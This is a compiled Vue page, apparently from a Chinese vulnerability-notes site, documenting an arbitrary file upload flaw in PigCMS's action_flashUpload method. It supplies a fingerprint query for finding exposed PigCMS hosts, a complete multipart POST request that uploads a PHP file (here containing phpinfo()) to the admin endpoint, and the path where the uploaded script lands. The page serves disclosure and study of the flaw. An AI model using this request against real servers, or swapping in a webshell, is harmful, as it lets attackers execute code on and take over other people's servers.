import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>PigCMS action_flashUpload 方法中存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取到服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>pigcms</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app.name=&quot;PigCMS&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828161452591.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /cms/manage/admin.php?m=manage&amp;c=background&amp;a=action_flashUpload HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----aaa

------aaa
Content-Disposition: form-data; name=&quot;filePath&quot;; filename=&quot;test.php&quot;
Content-Type: video/x-flv

&lt;?php phpinfo();?&gt;
------aaa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828161506565.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/cms/upload/images/2023/08/11/1691722887xXbx.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,13),s=[t];function l(r,c){return e(),i("div",null,s)}const m=a(d,[["render",l],["__file","PigCMS action_flashUpload 任意文件上传漏洞.html.vue"]]);export{m as default};
